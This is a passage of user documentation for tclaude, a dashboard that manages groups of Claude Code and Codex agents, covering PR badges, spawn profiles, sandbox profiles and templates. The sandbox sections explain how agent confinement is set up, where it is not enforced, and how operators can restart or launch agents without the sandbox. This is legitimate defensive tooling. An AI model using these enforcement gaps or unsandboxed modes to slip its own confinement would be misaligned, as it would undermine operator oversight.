> deliberate degradations: on a host whose process table cannot be read, and
> for a command too short or too heavily quoted to match on, the reconcile
> has no opinion and a generous staleness TTL is the only bound — the count
> then falls back to the hook's view rather than to zero, since silently
> hiding real work is the worse failure.
>
> **The monitor badge shares this machinery.** A monitor's watch script is
> launched below the harness exactly the way a background shell is — the
> harness reports a command monitor's task type as `local_bash` — so both
> ledgers are reconciled in ONE pass over ONE process list, with each live
> process claimable by at most one entry. Two independent passes would let a
> shell and a monitor with similar commands both claim the same process, and
> so retire neither. Monitors carry one signal background shells do not: a
> non-persistent watch has a `timeout_ms` the harness itself enforces, which
> the ledger records as an absolute deadline (never extended by the watch
> still being alive now). Two things the reconcile cannot see: a **websocket**
> watch runs inside the harness process and has no descendant to match, so it
> is deliberately left to its deadline and the TTL rather than retired the
> instant the dashboard looks; and a **plugin-declared** monitor starts
> without a `Monitor` tool call, so no hook announces it and it never enters
> the ledger at all.
>
> The sub-agent badge rests on the same ledger discipline for a different
> reason: `SubagentStart`/`SubagentStop` both exist, but the pair is lossy —
> Claude Code fires no hooks at all on a user interrupt, for one — so `🤖+N`
> is not a raw event tally either. Any hook fired from inside a sub-agent
> re-adds/refreshes it, a staleness TTL ages out entries whose Stop was lost,
> and process (re)starts, interrupts, and exits reset it to zero.

The **working-directory** cell is clickable — clicking a path opens a terminal
window there (the same out-of-sandbox spawn the **term** button does, minus the
dir picker). The **branch** cell links to the branch's GitHub compare view, and
when the branch has a pull request a `#<num>` link to it is shown alongside.
Branch/PR links resolve in the background (cached, best-effort) and are simply
absent for a non-GitHub repo or when `gh` is unavailable.

The fixed footer also shows an **Open PRs** count for pull requests the active
GitHub identity has authored across any repository. Hover previews the list;
click/tap or keyboard activation pins it while you inspect or filter it. The
popover puts failing and running checks first, identifies the active agent
attached to a PR when one exists, and can narrow to PRs needing attention or
PRs with no active agent. Its GitHub search link is the escape hatch for the
complete list when the bounded dashboard result is truncated. The daemon polls
and caches this list in the background; the two-second dashboard snapshot never
runs `gh` itself.

The indicator is **permanent by default**: it stays in the footer at zero open
PRs (rendered muted rather than as a live counter), so it is a fixed place to
look rather than something that appears and disappears as the last PR merges.
Set `dashboard.always_show_open_prs` to `false` (Config tab → Dashboard → Open
PRs indicator) to go back to showing it only while something is open. Either
way it stays hidden until the daemon has resolved a GitHub identity — with no
`gh` login there is nothing to count.

The popover carries one more filter, **Closed Nd**, listing pull requests you
merged or closed within `dashboard.recent_pr_window_days` (default `3`, max
`30`). It is deliberately a separate list: recently closed PRs never enter the
open list, the footer count, or the attention/unattached tallies, and they are
dotted by their terminal state (purple merged, red closed) instead of by CI
state. The recent page is capped like the open one, and says so ("Showing the
first N") rather than presenting the cap as a complete count. Setting the
window to `0` removes the filter. The shared dashboard PR poll still searches
a one-day terminal window so Groups badges stay current. Narrowing applies on the next
dashboard poll; widening it takes effect on the next background search.

Each PR link carries a **CI indicator** — a compact `n/m` pill coloured green
(passing), red (failing) or amber (something still running). Skipped checks are
excluded from the denominator, so `12/14` means twelve of the fourteen checks
that actually had to run. Hovering (or focusing) the pill opens a scrollable
panel listing every check with its status, workflow, conclusion and elapsed
time, plus a link to the PR's checks page on GitHub; the panel stays open while
the pointer is over it. It is positioned against the viewport rather than the
table row, so opening it never extends the page's scroll area, and it flips
above the badge when a low row leaves more room up there — defaulting to below,
where the eye expects it. The side is chosen once, from the panel's maximum
height, so it never moves when the checks finish loading; the panel is kept
clear of the footer bar and the agent dock, and capped to the height actually
available so a long list scrolls inside it.

Clicking the pill opens the build behind it: the workflow run for whichever
check explains the badge's current state — a red badge goes straight to the
failing run, an amber one to the run still going, a green one to the most
recent finished run. When no run can be named (a PR checked only by external
CI apps) it falls back to the PR's own checks tab, so the pill is never a dead
control. Individual rows in the panel link to their own job.

The check data costs nothing on the 2-second snapshot: it rides along on the
`gh pr view` calls the branch-link and presented-PR refreshes already make, and
the snapshot only reads the resulting cache. A dedicated refresh happens only
while a human is actually hovering — the panel re-polls its own endpoint every
few seconds until the pointer leaves. A merged or closed PR's checks are frozen
and never re-polled. A PR whose checks have not resolved yet, or a repo with no
CI at all, shows no indicator rather than an empty one.

Per-member actions: **focus** the session, open a **terminal** in its
working directory, **clone**, **reincarnate**, **restart**, **rename**, edit
**role/descr**, toggle ownership, grant a **sudo** elevation, edit
**permissions**, schedule a **cron** job, and **remove** it from the
group. (Turning the agent on/off is the status dot's job — see above.
Permanently *deleting* an agent is offered on the virtual Ungrouped
group's rows, not on grouped rows — see below.)

The member ⚙ menu's ordinary **↻ restart** stops and resumes the same
conversation under its current durable launch configuration. This is the
quick way to pick up changes to assigned sandbox profiles: profile selection
and rules are re-resolved during resume. An active temporary sandbox-off
override remains active across an ordinary restart.

The member ⚙ menu also has **⚠ restart without sandbox** for a temporary
operator debugging window. It stops and resumes the *same conversation* under
the harness's unconfined mode, while preserving the agent's normal recorded
sandbox posture. While active, the item becomes **🔒 restore sandbox +
restart**. The override is keyed to the stable agent identity, so `/clear` or
reincarnation cannot lose it; a clone is a new agent and inherits the normal
posture, not the temporary unlock.

**🧩 sandbox implementation…** in the same menu is the opposite kind of action:
it records which layer owns OS-level confinement for the agent's *next* launch,
rather than restarting anything. That makes it offline-only — the item is
disabled while the agent runs and its tooltip names the stop → assign → wake
sequence. The picker lists each implementation with its description; the common
use is moving an agent created before `resource-only` existed onto it, so its
next launch gets a per-agent cgroup. The dialog reads the durable posture from
the server, not from the row, because the row's sandbox fields describe the last
launch. See [Sandboxing](sandboxing.md#moving-an-existing-agent-onto-it).

If a human terminal is attached to the agent's tmux session, the restart parks
that client on a short-lived bridge session and switches it onto the resumed
pane automatically. This is best-effort, like reincarnation's client handoff:
a tmux client that disappears or cannot be switched does not block the restart.
The bridge also expires after five minutes if the daemon exits or cannot run
its normal cleanup.

The live row badge is a shortcut to the same operation: click **🔒** to restart
temporarily without the sandbox, then click the resulting badge — normally
**⚠**, but still **🔒** if higher-precedence policy keeps the sandbox on — to
restore the preserved configuration. Other warning badges — an agent whose
normal launch is unconfined or whose verdict is unverified — remain
informational. Both transitions ask for confirmation; use **Ctrl/Cmd+Enter** to
confirm or **Escape** to cancel.

All restart actions above are deliberately refused unless the live session
reports `idle` and its database ledgers contain zero live background agents,
zero live background shell commands, and zero live monitors. The check is a basic preflight, not a
race-free lock: if the agent starts work just afterwards, the normal stop path
still governs the restart. If a restarted agent does not come back, the chosen
posture remains durable and the ordinary wake action retries it.

Per-group quick actions live above the roster as icon-only buttons (hover for
their labels): **spawn agent**, **create subgroup**, **power on**, and
**shutdown**. The remaining actions live in the group header menu: **+ add
member** (a searchable keyboard-navigable overlay), **⏰ schedule…** (a
group-scoped cron job), **✉ message** (a one-shot message to the group or a
ticked subset), **rename**, **⤓ export** (the whole group to a portable
`.zip`), **🧹 cleanup** (bulk-remove confirmed-offline members — see
[Cleanup](#cleanup)), **🪟 windows…** (bulk focus/unfocus the members'
terminal windows — optionally auto-tiled into a grid, see
[Config](#config)), and **delete group**.
The subgroup shortcut opens the standard create-group form with the current
group fixed as its parent and prefills the editable description, default
directory, and startup context from that parent. The
header also carries three click-to-edit chips: **📁 start-dir** (the default
working directory for agents spawned into the group), **📋 startup-context**
(shared guidance delivered to each spawned agent's inbox), and a **👥
member-cap** chip (`agent_groups.max_members` — a spawn that would exceed it
is refused; the chip turns orange when the group is full). All the header and
toolbar chips are keyboard-operable: Tab reaches them, Enter/Space activates,
and focusing a collapsed group's chips reveals their folded labels just like
hovering does.

A group may also carry one persistent http(s) attachment. This experimental
surface is **off by default**; opt in with
`features.group_attachments: "float"` or `"fixed"` in tclaude's config file, or
choose the corresponding mode in the
**Config → Experimental features → Group attachments** selector. Enabling it
in **float** mode exposes a compact **📎 paperclip** overlaid just above the
first letter of each group title. It is absolutely positioned with no frame or
reserved header space, so it never moves or resizes neighboring controls. Fine
pointers show it only while the group header is hovered; keyboard focus reveals
the attachment control itself, while non-hover touch devices keep it visible.

In **fixed** mode, the attachment control is a normal in-flow quick item at the
far right of the group header, after the sandbox-profile control and any
link-status chip. When unset, its paperclip stays dim until hovered and gains
the standard quick-control frame on hover. Once set, only the link/ticket label
is shown; it remains visible even when the other quick-item labels auto-fold,
dims and brightens with the other group quick controls, and underlines on hover.
Only the edit pencil appears on hover.

In float mode, an existing attachment's paperclip opens it; in fixed mode, its
label does. The pencil edits or clears it. The editor accepts an optional
display name and otherwise derives a short Linear issue key, GitHub number, or
hostname. Closing a floating editor returns focus to the group's native
disclosure summary so the hover overlay does not remain visible after Escape.
Turning the setting off hides both presentations without deleting stored
attachments.

The tab's filter bar carries **+ new group** and a **⚙ cog** menu holding the
less-frequent group-wide actions: **⤒ import** (recreate a group from an
exported `.zip`), **🧹 clean up** (the all-categories cleanup tool — see
[Cleanup](#cleanup)), **🗑 delete retired…**, **⧉ templates…** and **⧉ roles…**
(the [template](#templates) and [role-library](#roles-library) overlays), **⧉
profiles…** (spawn profiles), **🛡 sandbox profiles…**, and **🔗 links…**.
It also contains **⇄ cross-harness spawns…**, a directed spawn matrix for
agent-initiated delegation. Each source→target edge is allow/deny and a denial
records the reason returned to a blocked agent. The same editor appears in each
real group's ⚙ menu; group cells add an **inherit global** state and otherwise
override that one edge. Same-harness cells are always allowed, and human
spawns bypass the matrix. Every action in this global cog also has a Ctrl/Cmd-K
command-palette entry. Both vocabularies remain searchable in either theme:
for example, `templates` and `circles`, `sandbox` and `wards`, `links` and
`channels`, and `cross-harness` and `cross-realm` reach the same managers.

#### Filtering a ⚙ menu

All three of the Groups tab's cog menus — this toolbar one, each group header's,
and each agent row's — open with a **filter box** at the top and the keyboard in
it, so a long menu can be typed at instead of scanned. Every item is still an
ordinary click target in its usual place; the box only narrows which of them are
showing.

- Typing filters on what the item **says** plus its **tooltip**, so
  `blueprints` finds **⧉ templates…** and `conversation` finds **+ add member**.
  Both themes' wording is always searchable, whichever skin is active: `disband`
  finds **delete group** in the plain theme and `retire` finds **banish** in 🧙.
  The Ctrl/Cmd-K palette's synonyms apply too — `hide` reaches a *veil*, `spawn`
  a *summon*.
- **↑/↓** move a cursor over the matches and wrap; **Enter** runs the one under
  it, which is the topmost match as soon as you type, so `clone`+Enter works
  without arrowing first. Moving the mouse takes the cursor over instead. The
  cursor survives the 2s snapshot refresh, so a menu that redraws under you does
  not lose your place.
- **Esc** clears a non-empty box, and closes the menu when it is already empty.
- Order is deliberately **not** re-ranked: matches stay where they sit in the
  menu, so a filtered menu still reads like the menu you know. Disabled items
  are still listed — their tooltip is what explains why they cannot run — but the
  keyboard skips them.

These menus keep growing, and this is the cheap way in: the filter reads each
item's rendered label, so a newly added action is searchable the moment it is
added, with nothing to register.

The menus stay `role="menu"` / `role="menuitem"` — the click path is a menu, and
converting ~55 items to listbox/option would be a lot of churn for a secondary
surface. The filter box is a `combobox` over the menu it `aria-controls`, which
is what makes its `aria-activedescendant` cursor reference resolve.

Toggles surface three
**virtual groups** below the real ones: **Ungrouped** (online agents in no
group),
**Retired** (agents demoted to plain conversations, each with a
**reinstate** button), and **Conversations** (recent non-agent
conversations, each with a **promote** button). Dragging a row onto or off
these virtual groups joins / leaves a group or promotes a conversation into
an agent.

Any **online** conversation is enrolled as an agent automatically — a
terminal-launched session (`tclaude conv new`) surfaces in **Ungrouped**
the moment it starts, the same way a web-UI spawn does, with no manual
promote needed. (A session tclaude did not launch — a plain reattach, or
a session predating this behaviour — is picked up by the daemon's online
sweep within a reaper interval instead of instantly.) The **promote**
button is therefore mainly for *offline* past conversations you want back
on the roster; a conversation you deliberately **retire** stays retired
even while its pane is still running.

For managed Codex agents, the state pill keeps an unexpected nonzero exit on
the active operational surface: **crashed**, **restarting**, **crash loop /
backoff** (with restart count and next retry), **recovered automatically**, or
**recovery suppressed**. A scheduled retry is therefore never reduced to a
generic offline label. The recovery view is deliberately bounded to status,
safe reason codes, launch identifiers, counts, exit code/signal evidence, and
timestamps. The **recovered automatically** pill clears on the first later
session hook, or after one minute without another hook; durable recovery
transitions remain available in the audit log.

Retired conversations are kept **forever** by default — retire is the
non-destructive half of cleanup. If you'd rather reclaim the long tail
automatically, the Config tab's **Retention & cleanup → Retired-agent auto-cleanup**
toggle opts into a periodic sweep (every 30 min, and at `agentd serve`
startup) that
*permanently deletes* anything retired longer than a window you set
(default ≈ 1 year). It's off until you enable it, and deleting a
conversation never loses its recorded cost — spend totals survive.

**Drag-and-drop.** Drag a member row onto another group's header to **move**
it; hold **Ctrl** (**Cmd** on macOS) while dragging to **clone** it into the
target group instead, leaving the original in place. A hint pill follows the
cursor and the drop target's outline flips colour to show which effect is
armed.

Group headers are drag handles too. A plain drag reorders or nests the group;
hold **Ctrl** (**Cmd** on macOS) to copy it instead. The green copy marker shows
the destination, then the existing clone dialog opens so you can review the
new name and whether members or owners come along. Edge drops create a sibling
at the target's level, including inside subgroup trees; dropping a group onto
itself creates the clone beside it.

### Spawn Profiles

Reusable launch presets for agents. A spawn profile can carry the harness,
model, effort, sandbox / permission-mode defaults, OpenCode tool governance,
agent name, free-text display-role label, saved behavior/access roles, description, initial
message, profile-specific startup context, dialog toggles, owner default, and per-slug permission
overrides. It deliberately does **not** carry a working directory or worktree:
those stay per-spawn.

When Codex is selected, the spawn dialog and profile editor show a three-state
**Fast mode** selector. **Harness default** leaves the global Codex config in
charge; **On** selects the faster, higher-credit-cost service tier for that
agent; **Off** forces the standard tier even if fast mode is globally enabled.

**Profile context** is durable guidance for the kind of agent the profile
launches—for example, model-specific working preferences. It is injected as
its own startup-briefing section, alongside (and independently from) the
group's shared context and the per-spawn task brief. Changing the task does not
replace it, and opting out of group context does not suppress it. When several
profile tiers participate, the highest-precedence compatible profile with
non-empty context wins; contexts are not concatenated.

A profile may also have multiple **aliases**: alternate handles such as
`codex-reviewer` for a canonically named `gpt5.6-sol-high` profile. Aliases
resolve anywhere a spawn profile is accepted, including `agent spawn
--profile`, defaults, templates, process agent performers, Ask, and
Scribe. The palette keeps one card per real profile and shows its aliases next
to the primary name. Cards stay compact with a truncated chip list; hover the
card, or keyboard-focus its action button, to open a tooltip to its left with
the complete wrapped list of aliases and set profile fields. Profile cards
suppress native browser tooltips so the rich details remain the only hover
surface, and hide the rich details while the card is being dragged. Selectors
offer each alias separately as
`alias → primary-name`.

Open the manager from the Groups tab cog (**⚙ → ⧉ profiles…**). The manager can
create/edit/**clone**/delete profiles and now also **⇪ export** / **⤒ import**
portable profile bundles. Export opens a checklist of saved profiles so you can
uncheck anything that should not travel. Import reads a bundle, previews every
profile, lets you uncheck rows, and handles existing-name conflicts per profile
by renaming or overwriting.

New or previously unpinned OpenCode profiles start from a paired recommendation:
the **tclaude built-in OS sandbox** and permission mode **allow-tools**. The
sandbox keeps that autonomous permission posture confined. This is a profile
authoring recommendation, not a change to an unprofiled OpenCode launch, whose
approval fallback remains `deny`.

**clone** is the way to spin a variant off an existing profile. It opens the
ordinary editor on a copy, pre-filled with a free `<name>-copy` handle, so the
duplicate is reviewed and validated like any hand-written profile before it is
saved. The copy starts with no aliases: an alias is a single-holder handle in
the same namespace as primary names, so carrying the source's over would only
collide.

Like the group-templates panel, the profile, role and sandbox-profile managers
are **resizable** — drag the bottom-right grip on either axis. Each panel
remembers its own size across reopen, daemon restart, and browser tab.

A profile can be **disabled without deleting it**. Its editor keeps a Disabled
checkbox and required reason; disabled profiles remain visible, editable,
exportable, and available in selectors with a prominent **🚫 Disabled** marker.
Any direct,
default-, role-, template-, or process-driven spawn that would use one fails
with the stored reason, as does `tclaude ask` when configured to use it. Clear
Disabled to make all existing references usable again; the editor retains and
shows the previous reason so it can be reviewed or reused next time.

A profile can also be marked **Operator only**. It stays available to the
dashboard and other human-owned spawn surfaces, but any agent-originated spawn
that resolves through it is refused. The profile manager and pickers mark it
with **👤 Operator only** so this restriction remains visible without treating
the profile as disabled.

### Sandbox Profiles

Sandbox profiles are separate, harness-neutral launch policy: absolute
filesystem rules (`read`, `write`, or `deny`), literal environment entries,
and optional agent-owned directory variables. For each agent-owned variable,
agentd creates a fresh private writable cache directory at spawn and injects
its path as the variable's value. The directories persist across resume and
reincarnation, are fresh for clones, and are deleted when the owning agent is
retired. A later reinstate and resume recreates them empty. A deny
blocks both reads and writes and dominates an exact-path grant from another
applied profile. Open the
manager from **Groups → ⚙ → 🛡 sandbox profiles…** to create, clone, edit, or delete named
profiles and assign one global default or one default to each group. The spawn
dialog also offers a human-controlled explicit profile selector.

A profile can also **include** other profiles, recursively. Included profiles
apply first, in listed order, then the including profile's own entries
override any exact-same-path or same-variable values they supplied — an
authoring convenience for sharing a base profile across many variants. This
within-profile layering is distinct from the cross-scope composition above:
when the flattened global, group, and explicit profiles are combined, deny
still dominates. The daemon keeps the include graph dangling-free and acyclic:
saves referencing unknown profiles are rejected, renames follow into
referrers, and a profile cannot be deleted while another profile includes it.
Exporting a profile automatically bundles the profiles it includes.

Strictness is expressed entirely through the ordinary filesystem table:
a broad `deny` row (for example the home directory) plus the narrower `read`
and `write` rows that reopen exactly what the agent needs. There is no separate
read-baseline or exclusion mechanism — an operator who wants a near-deny-all
posture composes it from rows and must reopen the harness, tclaude and
toolchain directories (`~/go`, `~/.cargo`, `~/.codex`, …) themselves or the
agent cannot function. Claude Code resolves overlapping read rules by
specificity — the more specific path wins — so a reopen carves out of the deny.
Codex does **not**: a deny normally dominates any narrower grant regardless of
specificity, so reopens are available there only under the managed profile on
Linux with a verified split-policy probe, and are refused on macOS. A reopen
beneath a deny is likewise capability-gated at launch on Claude Code (sandbox
`on` required), so a profile a harness cannot faithfully enforce fails with a
typed error rather than pretending isolation. The editor's **＋ add common
rule** menu, folded under the filesystem table, offers audited presets for the
locations most profiles want denied (SSH credentials, cloud configuration, VCS
tokens, toolchain caches, browser profiles, the whole home directory). Each
entry shows its description, its warning, and the exact current-machine paths
it would insert *before* you click; selecting one appends those paths as
ordinary `deny` rows and repeats the warning in a notice naming what was added.
Nothing about the preset is stored: afterwards they are plain rows you can
edit, retarget, or delete, and a path already in the table is left as authored
rather than duplicated.

The filesystem table can also show **inherited global config rules** through a
checkbox that starts unchecked. These subdued, read-only rows come from Claude
Code's user-level `~/.claude/settings.json` sandbox filesystem block and
tclaude's managed Codex baseline rendered into every generated
`tclaude-agent-<launch-id>.config.toml` permission profile. A badge says whether
each rule applies to Claude, Codex, or both. When the rows are shown, an adjacent
filter can display both harnesses, only Claude, only Codex, or neither; shared
rows and their provenance are narrowed to the selected harness. Each row's
tooltip identifies the source, setting, and whether the Claude sandbox is
currently enabled. They are context for the effective launch policy, not part
of the named profile: hiding them, opening raw JSON, cloning, exporting, or
saving never copies them into the profile. The final launch can still add
workspace, Git, agent-owned-directory, and assignment-layer rules that depend
on its cwd and selected global/group/explicit profiles; the spawn dialog
remains the authoritative composed preview.

Profiles saved before this change may still carry the
retired `read_baseline`/`read_baseline_exclusions` fields; the dashboard
ignores them rather than rendering an enforcement that no longer exists — such
a profile is no longer strict despite its name, so audit it and re-express the
intent as deny rows (see `docs/agent.md`). The protected tclaude/harness state
(`~/.tclaude/data`, `~/.claude/sessions`) is unreachable from any profile: the
daemon rejects a filesystem rule whose path intersects one of those roots, and
there is no second representation that reaches them. The dashboard therefore
has no break-glass editor, warning banner, or acknowledgement checkbox — TCL-791
removed the feature, and a payload still carrying `break_glass_filesystem` or
`break_glass_acknowledged` is refused by the daemon with the typed
`break_glass_removed` code rather than saved with the field dropped. `~/.codex`
is not protected — it is ordinary harness state that a deny row may cover and
that a denied Home must reopen. Includes never hide origin: previews attribute
every filesystem row to the profile and scope that introduced it.
Agent-initiated spawns, resume, and reincarnation cannot drop an effective deny
row, nor reopen a path beneath one that the parent did not reopen.

When agentd runs on macOS, the editor also shows a collapsed **Compatibility —
macOS only** section. **Allow Mach service registration** is off by default and
authors `darwin_allow_mach_register: true`. The setting enables headless
browser/XPC process startup by adding `(allow mach-register)` to tclaude's own
Seatbelt profile. It does not alter Claude Code's or Codex's built-in sandbox,
so launches that use only a harness-owned implementation do not gain the
capability.

**🤖 configure with agent** summons a fresh, independently named sandbox scribe
for either a new profile or the draft currently open in the editor. Existing
scribes keep working in parallel. The scribe can discuss paths, literal
environment entries, and agent-owned directory variables and submit a
server-validated structured draft, but it
cannot save profiles, change assignments, or launch agents. Its result is
loaded back into the normal editor; review every field and explicitly press
**Save sandbox profile** to open a server-normalized JSON diff. Confirm that
preview to persist it. Creating or editing a profile is first validated as a
dry run, so canceling the preview does not change the profile library.

The spawn dialog's preview names the composed sandbox-profile layers (global,
group, and an explicit profile when one is chosen), effective filesystem access,
and environment **names**. It never shows
environment values. Values are ordinary non-secret configuration — do not put
credentials in a sandbox profile — and changes take effect only when an agent
is spawned or relaunched. The daemon remains authoritative for canonical path,
protected-root, reserved-variable, containment, and harness capability checks.

The spawn dialog also contains an operator-only
**Allow launch without enforcement** checkbox. It starts
unchecked on every open and harness switch, is never saved in a spawn profile
or launch preferences, and applies only when that fresh spawn's exact
closed-network request cannot be enforced. Checking it opens outbound network
access for that launch; it does not weaken enforceable filesystem or Unix-socket
rules and cannot bypass other refusal classes. An authorized launch is recorded
with a `not_enforced` network notice, so its Groups badge is a warning rather
than a lock. Resume, reincarnate, and clone do not inherit the authorization.
Direct `/v1` requests cannot exercise this dashboard-origin operator action.

The editor has separate **Network** and **Unix sockets** fieldsets. Network
authoring starts with Deny all, Allow all, or No override; each built-in pack
has a compact Off/Allow/Deny control and each manual destination has its own
Allow/Deny mode. Deny wins when both modes match, independent of row order.
Deny rows are stored but display **Not enforced** until the follow-up applier
work lands; their badge never implies that traffic is currently blocked.
No override carries no network rows. Unix sockets retain their
unset/open/closed/list modes. Both axes show inherited harness-global context
and audited insert-only presets. The **Effective policy preview**
shows concrete effective rules grouped as **Fully supported rules**,
**Partially supported rules**, and **Unsupported rules** for the selected
implementation/harness/platform. Partial and unsupported groups open
automatically, while fully supported rules always start folded. All three
groups remain visible with a rule count, including zero-count partial and
unsupported groups. Unset axes are omitted. The composed
sandbox-profile layers — global, group, and the explicit draft when one applies
— are named by scope on screen; the rule that explains how they combine stays
behind a secondary disclosure.

The preview's target controls — agent harness, sandbox implementation,
operating system — each offer **Resolved defaults**, the dashboard's one name
for the launch values a real spawn would resolve. Leaving all three at that
setting evaluates the draft against the launch the daemon would actually
produce for the selected group; the launch chain is *explicit launch choice →
named spawn profile → group default spawn profile → global default spawn
profile → harness default*, and the preview reports which tier it took under
**Evaluation details**. Because the preview has no spawn dialog and no
`--profile`, its own resolution starts at the group default spawn profile.
Overriding a control replaces resolution for that axis only.

Keep this distinct from sandbox-policy composition. Resolved defaults pick one
winner per launch field; sandbox profiles do not compete — the global sandbox
profile, the group sandbox profile, and an explicit sandbox profile all apply
together. Claude's harness-builtin mode `inherit` is rendered in plain language
throughout ("Claude settings decide"), because the token alone does not say
whether the built-in sandbox ends up enabled; for the same reason, naming a
resolved implementation owner never asserts that its sandbox is switched on.

Each assignment context has its own verdict, while the daemon also evaluates
every context for the aggregate safety result. If another assignment has a
worse result, a concise warning remains visible even when that context is
omitted from the selector. A narrower read/write carve-out
beneath a denied parent is therefore visible even when the two rows come from
different profile scopes, without making an unaffected selected group inherit
another group's warning. The prediction distinguishes the tclaude layer's
process wall from Claude Code's built-in-tool carve-out gap and Codex's macOS
denied-parent refusal. Empty list intersections are warnings, never save
blockers. Limitation text uses the daemon's exact resolver detail; the editor
does not guess support from the selected mode. The raw JSON view includes both
`network` and `unix_sockets`.

The selector's **none** choice explicitly omits every tclaude sandbox-profile
tier for that launch, including global/group environment values and agent-owned
directories; blank instead composes the global and group tiers. Selecting Codex
`danger-full-access` forces **none** and disables the selector: the raw
no-sandbox mode cannot represent the managed profile's filesystem policy.

Filesystem paths do not have to exist when a profile is saved. The editor
marks missing paths and offers an explicit **Create missing directories**
action with `mkdir -p` semantics; saving never creates directories implicitly.
A profile containing missing read/write paths can still be applied at launch.
Those rules stay frozen but inactive for that launch; if an ordinary directory
exists on a later launch, it is revalidated and the rule becomes active. A
missing deny target fails launch because the restriction cannot safely be
omitted. Existing
ancestors are still resolved and protected roots are still rejected while the
profile is authored and again at launch. Directory creation uses
no-follow traversal to reject symlink substitutions. The create action only
materializes read/write targets, never deny-only paths. On macOS, where there is
no search-only directory descriptor, existing ancestors must also be readable.
Portable imports likewise preview missing local paths as warnings instead of
rejecting the bundle.

For routine assignment, the Groups toolbar has a global 🛡 chip beside the
dashboard spawn-profile default, and every group header has its own 🛡 chip
beside the group's 🧠 spawn-profile chip. Like the 🧠 chips, each 🛡 chip is
icon-only while unset, shows the assigned profile name when one is set, and
turns into an inline one-shot picker when clicked (including a "＋ new sandbox
profile…" shortcut into the editor). The dashboard 🧠 spawn-profile default
uses the same inline interaction. An unset group chip inherits the global default.
Use the full manager to author or inspect profiles; use these quick controls to
assign or clear them in context.

### Templates

Reusable **group blueprints**. A template describes a whole team that does not
exist yet — unlike a group [export](#groups) it holds no conv-ids. Open the
templates overlay from the Groups tab's filter-bar cog (**⚙ → ⧉ templates…**).

**A minimal template is just a name, a roster, and per-agent briefs** — that
alone instantiates a working group. Everything below is an *optional advanced
layer* you add only when you want it, so don't read the list as a wall of
required concepts. A full template can carry:

- a **roster** of agent specs — name, role label, description, task brief, and
  an **owner** flag (which member leads the group);
- a **role reference** per agent (`role_ref`) into the [roles library](#roles-library),
  so the agent inherits that role's canonical brief and baseline permissions;
- **a launch profile per agent** — the agent's launch shape *and* its birth-time
  permissions are a single **pick a stored [spawn profile](#spawn-profiles)**: the
  profile's harness / model / effort / sandbox / approval and its
  grant/deny permission overrides all ride onto the spawned agent. The editor's
  launch row is a profile dropdown with **＋ new** (create one inline and use it)
  and **⧉ manage…** (open the real profiles manager) — there is no duplicated
  field set or permission-checkbox list in the template editor; a profile is the
  unit of launch config. The **owner** flag stays a separate per-agent checkbox
  because ownership is *structural* (which member leads), not launch config — at
  deploy it is **unioned** with the profile's own `is_owner` default (either one
  makes the agent an owner);
- an ordered, routed **work pattern** — briefing messages delivered, in order,
  once the whole roster has spawned (each routed to one agent or `all`);
- an advisory **process** — an ordered list of phases (the quest plan), tracked
  at runtime but never enforced (see [Steering a force](#steering-a-force));
- staged-spawn **waves** — agents tagged with a wave number spawn in ascending
  order, each wave holding until the previous one has come up and gone idle;
- **rhythms** — recurring nudges that become ordinary group cron jobs when the
  force is deployed (see [The rhythm model](#the-rhythm-model));
- an optional **per-agent worktrees** default — pre-checks the deploy dialog's
  “Give each agent its own worktree” option without locking it, so each spawn
  can still override the template preference.

> **Templates authored before the profile picker** may carry inline launch
> fields or an inline permission list on an agent. Those still apply when you
> deploy and are preserved when you re-save — nothing is silently dropped — but
> they can no longer be edited inline. The editor flags such an agent with a
> **⚠ legacy inline** notice and an **Extract to profile…** button that
> materializes the inline values into a reusable spawn profile and points the
> agent at it. (Bundled [starters](#starter-task-forces) that still list an
> inline `groups.members.spawn` grant on their lead deploy correctly for the same
> reason.)

Per-card actions: **🚀 deploy** (against a mission — see
[Task forces](#task-forces)), **⎘ instantiate** (create a group with no
mission), **edit**, **⇪ export** (a portable `<name>.task-force.json` file), and
**delete**. Each card also lists the **🚀 forces** already deployed from that
template. The overlay's own buttons are **+ new template** (from scratch),
**⤓ from a group** (snapshot an existing group's structure), **⤒ import** (read
an exported file back — see [Sharing task forces](#sharing-task-forces-as-a-file)),
and **⭐ starters** (see [Starter task forces](#starter-task-forces)).

> In 🧙 **wizard mode** these labels re-theme — a template is a "summoning
> circle", **🚀 deploy** reads **🧙 summon**, **⭐ starters** reads **⭐ conjure
> a preset party**, and so on. The affordances are identical; only the copy
> changes.

> **Editing circles by chat.** Everything this editor does is also a
> permission-gated CLI/daemon endpoint, so a **scribe agent** granted
> `templates.manage` can author and edit templates by conversation — no
> dashboard needed. Reads stay open, so any agent can discover and inspect
> circles. See [Agentic template editing](agent.md#templates) for the grant
> bundle and the bundled `agent-circles` skill. The **Config tab → Ask & scribe
> defaults** selector picks which saved spawn profile a freshly summoned scribe
> launches with (harness / model / effort) — e.g. to run scribes on Codex; it
> applies to each fresh summon and is stored as `scribe.profile` in
> config.json.

#### Sharing task forces as a file

A template can be exported to a single self-contained JSON file and imported on
another machine — the supported way to share a task force with a friend, a
coworker, or your own other computer. The file is a small versioned envelope
around the template:

```json
{
  "format": "tclaude-task-force",
  "format_version": 1,
  "exported_at": "2026-07-03T21:00:00Z",
  "template": { "name": "feature-team", "agents": [ ... ], "work_pattern": [ ... ] },
  "roles":    [ ... ],
  "profiles": [ ... ]
}
```

The `template` object is exactly the shape the editor and
`tclaude agent templates show --json` use, so every template field — agents,
launch-profile references, the work pattern — travels automatically. The
envelope also **embeds the full definition of every [role](#roles-library) and
[spawn profile](#spawn-profiles) the template references**, so a profile-driven
team reproduces its launch shape + permissions on another machine. The file
carries **no machine-local identity**: no database ids and no conversation
links, just the blueprint.

On import, the embedded roles and profiles are **materialized only if they are
missing** on the target machine — an existing role/profile of the same name is
never overwritten (your local edits are sacred; the import reports it kept the
local version). References that still can't be resolved **degrade with a
warning** rather than failing the whole import:

- a **spawn-profile reference** naming a profile that isn't defined here and
  wasn't embedded is dropped (the agent falls back to the group/harness default);
- an **unknown permission slug** on an agent's legacy inline list is dropped.

A **name collision** is refused unless you opt in: tick **Overwrite if it already
exists** (CLI `--update`) to replace the existing template in place, or set
**Import as** (CLI `--as <name>`) to store it under a different name. An export
written by a **newer tclaude** (higher `format_version`) is rejected with an
“upgrade tclaude” message.

From the CLI:

```bash
tclaude agent templates export feature-team --file feature-team.task-force.json
tclaude agent templates import --file feature-team.task-force.json          # errors on a name clash
tclaude agent templates import --file feature-team.task-force.json --as ft2  # import under a new name
tclaude agent templates import --file feature-team.task-force.json --update  # overwrite in place
```

#### Starter task forces

tclaude ships a small library of **curated, ready-to-run starters** so you can
